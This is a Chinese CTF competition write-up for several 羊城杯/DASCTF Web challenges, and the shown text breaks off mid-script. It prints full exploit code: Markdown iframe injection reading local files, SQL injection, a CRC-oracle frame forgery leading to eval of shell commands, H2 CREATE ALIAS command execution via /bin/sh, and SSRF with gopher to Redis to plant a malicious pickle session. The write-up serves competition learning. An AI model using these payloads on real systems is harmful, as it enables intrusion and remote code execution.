---
title: 【先知】羊城杯wp
source: https://xz.aliyun.com/news/93039
source_host: xz.aliyun.com
clip_date: 2026-10-28T08:27:59+08:00
trace_id: a555c4dc-9d4e-4766-89b2-c0c3836b1bdc
content_hash: 352a834e1697cfdc7ed754df7274187bf4589374a89bb09b10121e9adf6ad641
status: synced
tags:
  - 先知
  - CTF
  - Web
series: null
feed_source: 先知安全技术社区
ai_summary: "**TL;DR：** 羊城杯 CTF 全方向复盘：4 道 Web、2 道逆向、3 道 Misc 题的直接利用方法、完整 exploit 与实际 flag。"
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 40775244-d011-81a3-8fdb-e116d6aaae67
ioc:
  cves: []
  cwes: []
  hashes:
    - "01037418648210783796590886755343"
    - 0193fddd8eb9518d1c897b1804083891f715056031670b78decfe5f89b35c163
    - 04e6e9fa5e20e4b21b82511f1dd9d85e34df2ea090c312558ceefe4ff566d506
    - "24092190822449365053592936181340"
    - "26226603916895072847898100587588"
    - 36db20542b52b8543480879d415532de
    - "39348558134383104253551064768922"
    - "55357378852365389715701218631867"
    - "65629149808568742693289483845389"
    - "66750917978933250835878997716903"
    - "68372310670691263931645585396277"
    - "68895368246319039617552845046338"
    - "69107165859971918714064961070761"
    - "79376082025581919530205451854008"
    - "94909316515280660449476557139470"
    - "94922087195985397760636873682437"
    - 9a442b32986c690af07213508ae6c5ee
    - cc222acda86a869ae53d4fe1c0144a54190f756e4ecd170bedbb7deac5ae2c16
    - cfde9ebf5fb607b0c8d54abd707fa622fd8a246032d8b06d528e684f6238dcab
    - edf0907855a7dbcc5cb49787776133cd
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> **TL;DR：** 羊城杯 CTF 全方向复盘：4 道 Web、2 道逆向、3 道 Misc 题的直接利用方法、完整 exploit 与实际 flag。
> 
> - **Web 注入点：** pdfchallenge 利用 Cherry Markdown 语言名未转义、先渲染后清洗的顺序缺陷注入 iframe，借 file:// 上下文读取 /flag；FluxPipe 经 Ecto raw query 四列 UNION 注入拿管理员 key，再靠 CRC 侧信道（CRC 仿射、GF(2) 线性方程组、秩 128）解出 nonce 并伪造 FPX 帧，最终 eval 执行 /readflag。
> - **Web 其余链路：** GraphNexus 用 WebSocket NXUS 帧 + QUERY DSL 的 SQL() 注入 H2 2.2.224，CREATE ALIAS 包装 /bin/sh 实现 RCE，以 setuid /readflag 出 flag；DataPulse 用 SSRF（十进制 IP 2130706433 绕过黑名单）+ gopher 打 Redis SECRET 写入恶意 pickle 会话键触发反序列化 RCE。
> - **核心逆向：** 千千的咲 是 Android+UE+Puerts+WASM 多层结构，通过 493 条状态表的 32 位可逆掩码/四轮点击变换逆向恢复 3941 次点击（SHA-256 哈希链参与密钥派生），并用 Unicorn 仿真解密 12 轮 AES-CBC 得 flag{WuTher1ng_Waves_ch1Sak1_6666}。
> - **Misc 思路：** Lost_Memory 用自定义 Partial EWF+NTFS 解析器在损坏不完整镜像（~30.9GiB 可读）中恢复五块碎片加密还原；Jammed 通过 IBM Selectric 字球卡死表反查 48 位压缩包密码；skin secret 可能通过 CS 皮肤模板编号 Mo 图转 ASCII 还原 flag。
> - **关键坑点：** 时间戳要求字面 T 补齐、详情页私有地址为死隧道（必须用代理映射的公共地址）、题目 hash 不一致但解密成功即密码有效。

## WEB

### pdfchallenge

pdfchallenge 是一道 Web 题。平台把用户提交的 Markdown 渲染成 PDF：前端使用 Cherry Markdown，服务端在无头浏览器里把渲染页打印成 PDF。关键点是渲染页本身的 URL 为 file:///tmp/renders/，页面运行在 file:// 协议下，因此只要能在渲染页中注入 HTML，就能用 iframe 读取渲染进程可读的本地文件。

真正的注入点在代码围栏（code fence）的语言名。Cherry 的 renderCodeBlock 会把语言名原样拼进 data-lang="${lang}"，只做 trim 和 toLowerCase，没有做 HTML 转义；同时 Cherry 的渲染顺序是先把 fence 渲染成 HTML 并缓存，之后才过 DOMPurify 白名单，最后再把缓存中的 HTML 还原回去。于是 fence 生成的内容绕过了清洗：语言名里用双引号闭合 data-lang 属性并补一个大于号，就能注入任意标签。由于渲染页是 file:// 源，注入 iframe 指向 file:///flag 后，打印 PDF 时 iframe 已把 flag 文件的内容渲染进版面。

利用时先确认指纹与渲染上下文：向 /render 提交 Content-Type 为 text/plain 的 Markdown，返回 application/pdf；观察渲染进程请求的中间页地址为 file:///tmp/renders/，确认 file:// 上下文。然后把语言名写成 x">，正文随便写一行，提交 /render。注意 Cherry 会把语言名转成小写，所以路径必须全小写；一次请求可以只测一个路径，也可以对 /flag、/flag.txt、/app/flag 等候选路径各生成一页、批量提交。拿到 PDF 后用 pdftotext 或 pypdf 提取文本：第一页文本依次为 PDFCHALLENGE、flag 与 File not found 时，说明 /flag 命中，其余候选路径均返回 File not found。

官方解法在其 12113/25509 实例上得到的 flag 为 DASCTF{26226603916895072847898100587588}；本队 12061 实例已下线，无法验证该实例的 flag。

下面给出一个自包含的复现脚本，按候选路径逐个生成注入用的 Markdown，调用 /render 并用 pdftotext 提取 PDF 文本；脚本中的目标地址需要按实际环境替换。

```python
import os
import subprocess
import sys
import tempfile

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:3000"
PATHS = ["/flag", "/flag.txt", "/app/flag", "/home/ctf/flag", "/root/flag"]


def payload(path):
    lang = 'x"><iframe src=file://%s width=800 height=600></iframe>' % path
    return "```%s\ntest\n```\n" % lang


def pdf_text(blob):
    with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as f:
        f.write(blob)
        name = f.name
    try:
        return subprocess.run(
            ["pdftotext", name, "-"], capture_output=True, text=True, timeout=30
        ).stdout
    finally:
        os.unlink(name)


for path in PATHS:
    body = payload(path).encode()
    r = requests.post(
        BASE + "/render",
        data=body,
        headers={"Content-Type": "text/plain"},
        timeout=180,
    )
    if r.status_code != 200 or not r.content.startswith(b"%PDF"):
        print(path, "HTTP", r.status_code, r.text[:120])
        continue
    text = pdf_text(r.content)
    print("==", path)
    print(text[:800])
    if "DASCTF{" in text or "flag{" in text:
        print("HIT", path)
        break
```

修复建议是对语言名做 HTML 转义或属性值白名单，不要采用“先渲染、后清洗、再还原缓存”的流程，渲染进程使用低权限用户运行，并且不要把 flag 放在渲染进程可读的路径下。需要说明的是，赛后我们在本队的 12061/28295 实例上复测时，注入值确实进入了 data-lang，但整个代码块被后置清洗器转义成了文本；官方 writeup 所用的 12113/25509 build 使用的是更简单的 pre data-lang 模板，注入可以直接生效。因此这份 payload 对 Cherry 的版本和渲染管线是敏感的，复现时需要以目标实例的实际模板为准。本题我们未在比赛期间解出、未提交得分，本文是依据官方解法整理的赛后复盘。

### FluxPipe

FluxPipe 是本届比赛的一道 Web 题。题目给出的是一套实时数据流处理管道配置平台，对外只映射了 4000 端口的 HTTP 服务，题目描述中提到的 FPX 服务 4001 端口并没有直接暴露，因此整个解题过程需要先从 HTTP 面进入，再桥接到内部协议。平台技术栈为 Elixir 的 Plug 与 Cowboy，后端是 PostgreSQL 15。拿到题目提供的发布包后，从中提取 BEAM 文件，解码其中的 LitT 分块（zlib 压缩的 ETF），恢复出隐藏路由表，包括健康检查、GraphQL、管道列表、管道搜索与导出、认证、调试指标与求值、FPX 握手与命令、实时 WebSocket 以及 v2 管理接口；其中部分路由是诱饵，真正可用的是管道搜索、认证、调试指标与 FPX 桥接接口。

第一跳是 SQL 注入。管道搜索接口把 status 参数直接拼进 Ecto 的 raw query，可以用四列 UNION 注入，并且错误信息会回显完整查询语句。数据库以超级用户运行，通过注入导出 users 表后拿到管理员 api_key（TaqdVg3xCx5rG5Y49e8c4fobgsjXj5i），再调用认证接口以该 api_key 换取管理员 bearer token。第二跳利用调试接口：带 x-pipeline-debug 请求头访问指标路由，会泄露 ETS 表内容和 FPX 协议说明。FPX 通过 HTTP 桥的握手与命令接口通信，帧格式为魔数 FBAE、命令字、长度、载荷和 CRC16；载荷使用 xor-rotate 加密，密钥为 sha256(erlang_cookie) 的前 16 字节，CRC 为 CRC16/ARC，覆盖命令字、长度与明文。

第三跳是 CRC 侧信道。构造长度为 0 到 16、CRC 错误的零载荷帧时，服务端会返回它计算出的 CRC，从而形成一个 CRC 计算 oracle；CRC 对数据是仿射的，于是可以把恢复密钥材料的问题化为 GF(2) 上的线性方程组，解出 nonce 36db20542b52b8543480879d415532de，方程组的秩为 128，与握手提示吻合。拿到密钥与 nonce 后，调用 read_ets 读取 pipeline_secrets，得到 erlang_cookie 为 0qvgZXa8cbCyaBEhJ2kynmUDp6upBSBR；最后调用 eval 命令执行 System.cmd("/readflag", \[\])，以 root 身份读出 flag。最终 flag 为 DASCTF{65629149808568742693289483845389}。这道题的关键在于从发布包恢复路由、把 CRC 的线性性质转化为侧信道，并用 ETS 泄露同时取得协议说明与关键 secret。

本题的完整利用脚本如下，实例地址、端口、会话令牌等运行参数需按实际环境调整。

SQL 注入与登录探测的代码如下。

```python
import http.client, json, urllib.parse, time
HOST,PORT='1.14.76.59',27838
sqlis = ["' OR '1'='1", "' OR 1=1 --", "x' OR '1'='1' -- ", "' UNION SELECT NULL -- ",
         "' UNION SELECT NULL,NULL -- ", "' UNION SELECT NULL,NULL,NULL -- ",
         "' UNION SELECT NULL,NULL,NULL,NULL -- ", "' UNION SELECT NULL,NULL,NULL,NULL,NULL -- ",
         "'; SELECT 1 -- ", "\\' OR 1=1 -- "]
headers_list = [
  ('X-API-Key','x'), ('api-key','x'), ('apikey','x'), ('X-Api-Token','x'), ('Authorization','x'),
  ('Authorization','Bearer x'), ('X-Auth-Token','x'), ('X-API-KEY','x'),
]
def req(method,path,body,hdrs):
    try:
        c=http.client.HTTPConnection(HOST,PORT,timeout=10)
        c.request(method,path,body,hdrs)
        r=c.getresponse(); d=r.read(); c.close()
        return r.status, d
    except Exception as e:
        return None, repr(e).encode()
for hname,hval in headers_list:
    for s in sqlis[:4]:
        st,d = req('POST','/api/v1/auth','{}',{'Content-Type':'application/json',hname:s if hval=='x' else hval+ ' ' + s})
        if st!=401: print('HDR',hname,hval,s,'->',st,d[:200],flush=True)
        time.sleep(0.2)
print('--- form/query/body variants ---')
for s in sqlis:
    for kind in ['form','query']:
        if kind=='form':
            body=urllib.parse.urlencode({'api_key':s}); hdrs={'Content-Type':'application/x-www-form-urlencoded'}; path='/api/v1/auth'
        else:
            body='{}'; hdrs={'Content-Type':'application/json'}; path='/api/v1/auth?'+urllib.parse.urlencode({'api_key':s})
        st,d=req('POST',path,body,hdrs)
        if st!=401: print(kind,repr(s),'->',st,d[:200],flush=True)
        time.sleep(0.2)
print('DONE',flush=True)
```

协议基础与 CRC 工具的代码如下。

```python
import http.client, json, time, re, sys

HOST,PORT='1.14.76.59',27838
API='TaqdVg3xCx5rG5Y49e8c4fobgsjXj5i'

def req(method,path,body=None,headers=None,timeout=15):
    c=http.client.HTTPConnection(HOST,PORT,timeout=timeout)
    h=dict(headers or {})
    if body is not None: h.setdefault('Content-Type','application/json')
    c.request(method,path,body,headers=h)
    r=c.getresponse(); d=r.read(); c.close()
    return r.status,d

def login():
    for _ in range(5):
        try:
            st,d=req('POST','/api/v1/auth',json.dumps({'api_key':API}))
            if st==200: return json.loads(d)['token']
        except Exception as e: pass
        time.sleep(0.5)
    raise RuntimeError('login failed')

def handshake(t):
    for _ in range(5):
        try:
            st,d=req('POST','/api/v1/fpx/handshake','{}',{'Authorization':'Bearer '+t})
            if st==200: return json.loads(d)['session_id']
        except Exception: pass
        time.sleep(0.5)
    raise RuntimeError('handshake failed')

def frame(cmd,payload,crc=0):
    return bytes([0xFB,0xAE,cmd])+len(payload).to_bytes(2,'big')+payload+crc.to_bytes(2,'big')

def oracle(t,sid,L,retries=6):
    fr=frame(1,b'\x00'*L)
    body=json.dumps({'session_id':sid,'frame':fr.hex()})
    for _ in range(retries):
        try:
            st,d=req('POST','/api/v1/fpx/command',body,{'Authorization':'Bearer '+t})
            m=re.search(rb'expected ([0-9A-Fa-f]+), got ([0-9A-Fa-f]+)', d)
            if m:
                return int(m.group(1),16), int(m.group(2),16)
            print('unexpected',st,d[:200],flush=True)
        except Exception as e:
            pass
        time.sleep(0.7)
    raise RuntimeError(f'oracle failed L={L}')

# CRC16/ARC per decompiled code
def crc16(data):
    crc=0xFFFF
    for b in data:
        crc^=b
        for _ in range(8):
            if crc&1: crc=(crc>>1)^0xA001
            else: crc>>=1
    return crc&0xFFFF

if __name__=='__main__':
    print('crc16([1,0,0]) =',hex(crc16(bytes([1,0,0]))))
    t=login(); sid=handshake(t)
    print('token',t,'sid',sid,flush=True)
    obs={}
    for L in range(0,18):
        c,g=oracle(t,sid,L)
        obs[L]=c
        print(f'L={L} computed={c:04X} ours={g:04X}',flush=True)
    json.dump({str(k):v for k,v in obs.items()},open('/home/lzl402/Desktop/ctf/DASCTF-2026/web-fluxpipe/probe/obs.json','w'))
```

CRC oracle的代码如下。

```python
import http.client, json, binascii, time, sys
HOST,PORT='1.14.76.59',27838
API='TaqdVg3xCx5rG5Y49e8c4fobgsjXj5i'
def req(method,path,body=None,headers=None):
    c=http.client.HTTPConnection(HOST,PORT,timeout=15)
    h=dict(headers or {})
    if body is not None: h.setdefault('Content-Type','application/json')
    c.request(method,path,body,headers=h)
    r=c.getresponse(); d=r.read(); c.close()
    return r.status, d
def login():
    st,d=req('POST','/api/v1/auth',json.dumps({'api_key':API}))
    return json.loads(d)['token']
def handshake(token):
    st,d=req('POST','/api/v1/fpx/handshake','{}',{'Authorization':'Bearer '+token})
    return st, json.loads(d)
def frame(cmd,payload,crc=0):
    return bytes([0xFB,0xAE,cmd])+len(payload).to_bytes(2,'big')+payload+crc.to_bytes(2,'big')
def command(token,sid,fr):
    body=json.dumps({'session_id':sid,'frame':fr.hex()})
    return req('POST','/api/v1/fpx/command',body,{'Authorization':'Bearer '+token})
if __name__=='__main__':
    t=login(); print('token',t)
    st,hs=handshake(t); print('handshake',st,hs)
    sid=hs['session_id']
    for L in range(0,20):
        st,d=command(t,sid,frame(1,b'\x00'*L))
        print(f"L={L} status={st} {d[:160]!r}", flush=True)
```

nonce 求解的代码如下。

```python
import json, re, time, http.client, sys
sys.path.insert(0,'/home/lzl402/Desktop/ctf/DASCTF-2026/web-fluxpipe/probe')
from fpx_solve import crc16, req, login, handshake, frame, oracle

def rotr(v,r):
    r%=8
    return ((v>>r)|(v<<(8-r)))&0xFF
def rotl(v,r):
    r%=8
    return ((v<<r)|(v>>(8-r)))&0xFF

obs={int(k):v for k,v in json.load(open('/home/lzl402/Desktop/ctf/DASCTF-2026/web-fluxpipe/probe/obs.json')).items()}
Ls=sorted(obs)
print('lengths',Ls)

def f(L, nbytes):
    return crc16(bytes([1])+L.to_bytes(2,'big')+bytes(nbytes[:L]))

# build equations
rows=[]  # (coef int over 128 bits, rhs bit)
for L in Ls:
    zero=[0]*L
    c=f(L,zero)
    y=obs[L]
    cols=[]
    for j in range(128):
        e=[0]*L
        if j//8 < L:
            e[j//8]=1<<(j%8)
        cols.append(f(L,e)^c)
    for b in range(16):
        coef=0
        for j in range(128):
            if (cols[j]>>b)&1: coef|=1<<j
        rhs=((y>>b)&1)^((c>>b)&1)
        rows.append([coef,rhs])
print('equations',len(rows))
# gaussian elimination
pivots={}
for coef,rhs in rows:
    while coef:
        p=coef.bit_length()-1
        if p in pivots:
            pc,pr=pivots[p]
            coef^=pc; rhs^=pr
        else:
            pivots[p]=(coef,rhs); break
    else:
        if rhs:
            print('INCONSISTENT'); sys.exit(1)
print('rank',len(pivots))
# back substitute: ensure upper triangular form by reducing existing pivots
piv=list(pivots.items())
# convert to rows list and do full RREF
mat=[ [coef,rhs] for p,(coef,rhs) in piv ]
for i in range(len(mat)):
    p=mat[i][0].bit_length()-1
    for j in range(len(mat)):
        if i!=j and ((mat[j][0]>>p)&1):
            mat[j][0]^=mat[i][0]; mat[j][1]^=mat[i][1]
sol=0
free=[]
for coef,rhs in mat:
    p=coef.bit_length()-1
    if coef==(1<<p):
        if rhs: sol|=1<<p
    else:
        pass
# check consistency of solution with all equations
ok=all((bin(coef & sol).count('1')&1)==rhs for coef,rhs in rows)
print('rank',len(mat),'solution consistent',ok)
nonce=bytes((sol>>(8*i))&0xFF for i in range(16))
print('nonce',nonce.hex())
print('hint match', nonce.hex().startswith('36db2054'))
```

密钥材料伪造的代码如下。

```python
import json, sys, http.client, time
sys.path.insert(0,'/home/lzl402/Desktop/ctf/DASCTF-2026/web-fluxpipe/probe')
from fpx_solve import crc16, req, login, handshake, frame

obs={int(k):v for k,v in json.load(open('/home/lzl402/Desktop/ctf/DASCTF-2026/web-fluxpipe/probe/obs.json')).items()}
Ls=[L for L in sorted(obs) if L<=16]
def f(L,n): return crc16(bytes([1])+L.to_bytes(2,'big')+bytes(n[:L]))
rows=[]
for L in Ls:
    c=f(L,[0]*L); y=obs[L]; cols=[]
    for j in range(128):
        e=[0]*L
        if j//8<L: e[j//8]=1<<(j%8)
        cols.append(f(L,e)^c)
    for b in range(16):
        coef=sum((1<<j) for j in range(128) if (cols[j]>>b)&1)
        rows.append([coef,((y>>b)&1)^((c>>b)&1)])
piv={}
for coef,rhs in rows:
    while coef:
        p=coef.bit_length()-1
        if p in piv:
            pc,pr=piv[p]; coef^=pc; rhs^=pr
        else:
            piv[p]=[coef,rhs]; break
    else:
        assert rhs==0, 'inconsistent'
mat=sorted(piv.values(), key=lambda r:-r[0].bit_length())
for i in range(len(mat)):
    p=mat[i][0].bit_length()-1
    for j in range(len(mat)):
        if i!=j and ((mat[j][0]>>p)&1):
            mat[j][0]^=mat[i][0]; mat[j][1]^=mat[i][1]
sol=0
for coef,rhs in mat:
    if coef.bit_length()-1 == (coef & -(coef)).bit_length()-1:
        pass
    p=coef.bit_length()-1
    if coef==(1<<p) and rhs: sol|=1<<p
assert all(((bin(coef&sol).count('1')&1)==rhs) for coef,rhs in rows)
nonce=bytes((sol>>(8*i))&0xFF for i in range(16))
print('rank',len(mat),'of 128; nonce =',nonce.hex())
assert nonce.hex().startswith('36db2054')

def rotr(v,r):
    r%=8
    return ((v>>r)|(v<<(8-r)))&0xFF
def rotl(v,r):
    r%=8
    return ((v<<r)|(v>>(8-r)))&0xFF
def encrypt(payload, key=nonce):
    return bytes(rotl(p ^ key[i%len(key)], i%8) for i,p in enumerate(payload))
def make_frame(cmd,payload,key=nonce):
    crc=crc16(bytes([cmd])+len(payload).to_bytes(2,'big')+payload)
    enc=encrypt(payload,key)
    return bytes([0xFB,0xAE,cmd])+len(enc).to_bytes(2,'big')+enc+crc.to_bytes(2,'big')

def send(t,sid,cmd,payload):
    fr=make_frame(cmd,payload)
    body=json.dumps({'session_id':sid,'frame':fr.hex()})
    return req('POST','/api/v1/fpx/command',body,{'Authorization':'Bearer '+t})

if __name__=='__main__':
    t=login(); sid=handshake(t)
    print('token',t,'sid',sid)
    st,d=send(t,sid,1,b'')
    print('list_ets:',st,d[:500])
    st,d=send(t,sid,2,b'pipeline_secrets')
    print('read_ets pipeline_secrets:',st,d[:2000])
```

最终求值的代码如下。

```python
import sys, json
sys.path.insert(0,'/home/lzl402/Desktop/ctf/DASCTF-2026/web-fluxpipe/probe')
from fpx_forge import send, login, handshake
COOKIE='0qvgZXa8cbCyaBEhJ2kynmUDp6upBSBR'
t=login(); sid=handshake(t)
codes=[
 'System.cmd("/readflag", [])',
 'File.read!("/flag.txt")',
 ':os.cmd(~c"cat /flag.txt")',
 'System.cmd("id", [])',
]
for code in codes:
    payload=(COOKIE+'|'+code).encode()
    st,d=send(t,sid,4,payload)
    print('CODE',code,'->',st,d[:1000],flush=True)
```

### GraphNexus

GraphNexus是一道知识图谱协作平台题。题目详情中给出的私有地址 192.168.6.217:8080 实际是死隧道，TCP 能连接但 HTTP 与 WebSocket 握手收不到任何字节；真正的入口是详情接口中代理映射生成的公共地址 1.14.76.59:19775，后续所有请求都通过该代理访问容器内的 8080 端口。目标是 Ktor 应用，协作入口是一个 WebSocket 路由，使用 RFC6455 二进制帧，帧格式为魔数 NXUS、一字节 opcode、大端四字节长度和载荷，opcode 分别对应握手、认证、订阅、更新、查询、导出、导入、结果与错误。发送空的订阅请求即可获得带 read、query、export、import 权限的会话 token；并发时偶发订阅失败属于竞态，本解法不需要利用竞态。

漏洞位于 QUERY 操作的自定义 DSL。该 DSL 支持节点计数、查询与查找，支持边计数，还支持 SQL 查询；其中 SQL() 会把内容直接交给后端 H2 数据库执行。解析器会先裁剪输入并丢弃最后一个右括号，因此在包装用的右括号前加一个空格，就能保留查询末尾的引号，构造任意 SQL。利用时先在未认证状态下通过 SQL() 执行任意 H2 语句，数据库版本为 H2 2.2.224；查询用户表可以泄露管理员 API token，但本解法后续并未使用它。接着用 CREATE ALIAS 定义一个返回 42 的 Java 方法并调用，返回 42 证明服务端具备运行期 javac 编译能力；再把 CREATE ALIAS 定义为执行 /bin/sh -c 的命令包装，调用后回显 uid=1000(appuser)。flag 文件由 root 只读保护，但 /readflag 是 setuid root 程序，执行它即可读出 flag。最终 flag 为 DASCTF{94922087195985397760636873682437}。本题的两个要点是入口必须使用代理地址而不是详情里的私有地址，以及利用 SQL() 包装器丢弃末尾右括号的解析边界问题。

本题的完整利用脚本如下，实例地址、端口、会话令牌等运行参数需按实际环境调整。

WebSocket 客户端的代码如下。

```python
#!/usr/bin/env python3
"""GraphNexus NexusFrame client helper."""
import socket, base64, os, struct, json, time, sys

HOST = '1.14.76.59'
PORT = 19775

MAGIC = b'NXUS'
OP = {'HELLO':1,'AUTH':2,'SUBSCRIBE':3,'UPDATE':4,'QUERY':5,'EXPORT':6,'IMPORT':7,'RESULT':8}
OPN = {v:k for k,v in OP.items()}

class Client:
    def __init__(self, host=HOST, port=PORT, path='/ws/collab', timeout=10):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.buf = b''
        key = base64.b64encode(os.urandom(16)).decode()
        req = (f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nUpgrade: websocket\r\n"
               f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n")
        self.s.sendall(req.encode())
        while b'\r\n\r\n' not in self.buf:
            self.buf += self.s.recv(4096)
        hdr, self.buf = self.buf.split(b'\r\n\r\n', 1)
        self.handshake = hdr
        assert b'101' in hdr, hdr
        self.session = None
        # consume hello
        f = self.recv_frame(timeout=timeout)
        if f:
            self.hello_frame = f
            op, data = f
            nx = NXFrame.parse(data)
            self.session = nx.json().get('session')

    def _rd(self, n, timeout=None):
        if timeout is not None: self.s.settimeout(timeout)
        b = b''
        while len(b) < n:
            c = self.s.recv(n - len(b))
            if not c: raise EOFError('closed')
            b += c
        return b

    def recv_frame(self, timeout=5):
        try:
            b1, b2 = self._rd(2, timeout)
        except socket.timeout:
            return None
        op = b1 & 0x0f
        ln = b2 & 0x7f
        if ln == 126: ln = struct.unpack('>H', self._rd(2))[0]
        elif ln == 127: ln = struct.unpack('>Q', self._rd(8))[0]
        masked = b2 & 0x80
        mk = self._rd(4) if masked else None
        data = self._rd(ln)
        if masked: data = bytes(d ^ mk[i % 4] for i, d in enumerate(data))
        return op, data

    def send_ws(self, data, op=0x2, mask=True):
        header = bytes([0x80 | op])
        n = len(data); mb = 0x80 if mask else 0
        if n < 126: header += bytes([mb | n])
        elif n < 65536: header += bytes([mb | 126]) + struct.pack('>H', n)
        else: header += bytes([mb | 127]) + struct.pack('>Q', n)
        if mask:
            mk = os.urandom(4); data = bytes(d ^ mk[i % 4] for i, d in enumerate(data)); header += mk
        self.s.sendall(header + data)

    def send_nx(self, opcode, payload, raw=False):
        if not raw and not isinstance(payload, (bytes, bytearray)):
            payload = json.dumps(payload).encode()
        elif not isinstance(payload, (bytes, bytearray)):
            payload = str(payload).encode()
        packet = MAGIC + bytes([opcode]) + struct.pack('>I', len(payload)) + payload
        self.send_ws(packet)

    def recv_nx(self, timeout=5):
        f = self.recv_frame(timeout)
        if not f: return None
        op, data = f
        try:
            nx = NXFrame.parse(data)
        except Exception as e:
            return {'ws_op': op, 'parse_error': str(e), 'raw': data}
        return {'ws_op': op, 'opcode': nx.op, 'opname': OPN.get(nx.op, hex(nx.op)), 'payload': nx.payload}

    def close(self):
        try: self.s.close()
        except: pass


class NXFrame:
    def __init__(self, op, payload, raw=b''):
        self.op = op; self.payload = payload; self.raw = raw
    @classmethod
    def parse(cls, data):
        if data[:4] != MAGIC: raise ValueError('bad magic %r' % data[:8])
        op = data[4]
        ln = struct.unpack('>I', data[5:9])[0]
        payload = data[9:9+ln]
        if len(payload) < ln: raise ValueError('short payload %d<%d' % (len(payload), ln))
        return cls(op, payload, data)
    def json(self):
        return json.loads(self.payload.decode('utf-8', 'replace'))


def main():
    c = Client()
    print('session:', c.session)
    print('hello:', c.hello_frame[1])
    c.close()

if __name__ == '__main__':
    main()
```

DSL 查询的代码如下。

```python
#!/usr/bin/env python3
"""Robust GraphNexus DSL query with subscribe retry. Usage: q.py 'NODES.count' [--raw]"""
import sys, json, time
from wsclient import Client

q = sys.argv[1] if len(sys.argv) > 1 else 'NODES.count'
payload = q.encode() if isinstance(q, str) else q

c = None
for attempt in range(8):
    try:
        c = Client(timeout=5)
        c.send_nx(3, {})
        sub = c.recv_nx(3)
        if sub and sub.get('payload') and b'subscribed' in sub['payload']:
            break
        c.close(); c = None
    except Exception as e:
        if c: c.close()
        c = None
    time.sleep(0.3)
if c is None:
    print('SUBSCRIBE_FAILED after retries')
    sys.exit(1)
try:
    c.send_nx(5, payload)
    r = c.recv_nx(6)
    if r is None:
        print('NO_RESPONSE')
    else:
        print(r['payload'].decode('utf-8','replace') if 'payload' in r else r)
finally:
    c.close()
```

注入验证的代码如下。

```python
#!/usr/bin/env python3
"""One-shot GraphNexus DSL query: python3 dsl.py 'NODES.count'"""
import sys, json, time
from wsclient import Client

q = sys.argv[1] if len(sys.argv) > 1 else 'NODES.count'
t0 = time.time()
try:
    c = Client(timeout=5)
    print('session', c.session, 't=%.2f' % (time.time()-t0), flush=True)
    c.send_nx(3, {})
    sub = c.recv_nx(3)
    print('sub', sub, flush=True)
    c.send_nx(5, q.encode())
    t1 = time.time()
    for i in range(6):
        r = c.recv_nx(4)
        print('resp[%d] t=%.2f' % (i, time.time()-t1), r if r is None else {k:(v[:800] if isinstance(v, bytes) else v) for k,v in r.items()}, flush=True)
        if r is not None:
            break
    c.close()
except Exception as e:
    print('EXC', type(e).__name__, e, flush=True)
```

CREATE ALIAS 命令执行的代码如下。

```python
#!/usr/bin/env python3
"""GraphNexus H2 RCE: create EXEC alias if needed, run shell command, print output.
Usage: rce.py 'id'   (argument is the shell command, sent inside single quotes)"""
import sys, json, time
from wsclient import Client

def connect():
    for _ in range(10):
        try:
            c = Client(timeout=6)
            c.send_nx(3, {})
            sub = c.recv_nx(3)
            if sub and sub.get('payload') and b'subscribed' in sub['payload']:
                return c
            c.close()
        except Exception:
            pass
        time.sleep(0.3)
    raise SystemExit('SUBSCRIBE_FAILED after retries')

def query(c, dsl):
    c.send_nx(5, dsl.encode())
    r = c.recv_nx(8)
    return r

SRC = ('String exec(String cmd) throws Exception { '
       'Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd+" 2>&1"}); '
       'byte[] b = p.getInputStream().readAllBytes(); p.waitFor(); '
       'return new String(b, "UTF-8"); }')

CREATE = "SQL(CREATE ALIAS IF NOT EXISTS EXEC AS '" + SRC + "' )"

def run(cmd, c=None):
    own = c is None
    if own: c = connect()
    try:
        r = query(c, CREATE)
        # ignore create result
        q = "SQL(CALL EXEC('" + cmd + "') )"
        r = query(c, q)
        return r
    finally:
        if own: c.close()

if __name__ == '__main__':
    cmd = sys.argv[1] if len(sys.argv) > 1 else 'id'
    r = run(cmd)
    if r is None:
        print('NO_RESPONSE')
    elif 'payload' in r:
        print(r['payload'].decode('utf-8', 'replace'))
    else:
        print(r)
```

### DataPulse

DataPulse是一套数据分析公司的内部任务调度平台，技术栈为 Django 加 gunicorn，前置代理。主要路由包括注册、登录、面板、任务创建与列表、Webhook 重试与日志，以及双重保护的内部管理接口；后端 Redis 同时存放 Celery 结果和 Django 会话缓存。Webhook 重试功能会请求用户提供的 URL，过滤器只拒绝字面量的回环地址，却接受十进制、八进制和十六进制形式的 IP，因此可以用 2130706433 这样的十进制整数访问 127.0.0.1，这是第一处绕过。

Webhook 客户端支持 gopher 协议并回显原始响应字节，这等价于对 Redis 的完整 RESP 访问，例如用 gopher 发送 PING 能收到 PONG。Django 的会话以 pickle 序列化后存放在 Redis 中，键名形如:1:django.contrib.sessions.cache 加会话标识。通过 gopher 向 Redis 写入一个新的会话键，值为恶意 pickle 载荷，然后带上对应的会话 cookie 访问面板，服务端执行 pickle.loads，从而获得以 ctf 用户身份的命令执行。flag 文件仅 root 可读，但 /readflag 是 setuid 程序；执行 /readflag 把输出暂存到 Redis，再用 gopher 读回，得到 flag。最终 flag 为 DASCTF{68372310670691263931645585396277}。这条链的核心是把 SSRF 的形式绕过升级为 gopher 打内网 Redis，再篡改会话触发反序列化。

本题的完整利用脚本如下，实例地址、端口、会话令牌等运行参数需按实际环境调整。

SSRF 与 Redis 会话注入的代码如下。

```python
import pickle, requests, urllib.parse, secrets, string, time
base="http://1.14.76.59:17921"; T="dbdf22a1-fa2f-470a-9a57-ec7837bd61af"
cookies={}
for line in open('cookies.txt'):
    if line.startswith('#HttpOnly_'): line=line[len('#HttpOnly_'):]
    if line.startswith('#') or not line.strip(): continue
    f=line.strip().split('\t')
    if len(f)>=7: cookies[f[5]]=f[6]
def enc(*args):
    parts=[f"*{len(args)}\r\n".encode()]
    for a in args:
        b=a.encode() if isinstance(a,str) else a
        parts.append(b"$"+str(len(b)).encode()+b"\r\n"+b+b"\r\n")
    return b"".join(parts)
def raw(payload):
